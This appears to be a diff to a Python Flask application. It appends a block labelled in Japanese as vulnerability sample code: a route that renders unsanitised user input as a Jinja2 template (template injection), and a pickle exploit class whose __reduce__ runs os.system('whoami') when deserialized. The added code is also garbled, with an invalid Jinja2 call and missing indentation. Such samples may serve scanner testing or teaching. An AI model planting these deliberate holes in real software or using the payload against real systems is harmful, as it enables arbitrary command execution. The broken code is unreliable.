@@ -214,3 +214,29 @@ def predict():
     except Exception as e:
         # エラー発生時は500番でエラーメッセージを返す
         return jsonify({"error": str(e)}), 500
+
+
+
+#脆弱性サンプルコード
+@app.route("/")
+def index():
+            username = request.values.get('username')
+            return Jinja2.from_string('Hello ' + username).render()
+
+import os
+import _pickle
+
+class Exploit(object):
+def __reduce__(self):
+return (os.system, ('whoami',))
+
+def serialize_exploit():
+shellcode = _pickle.dumps(Exploit())
+return shellcode
+
+def insecure_deserialization(exploit_code):
+_pickle.loads(exploit_code)
+
+if __name__ == '__main__':
+shellcode = serialize_exploit()
+insecure_deserialization(shellcode)
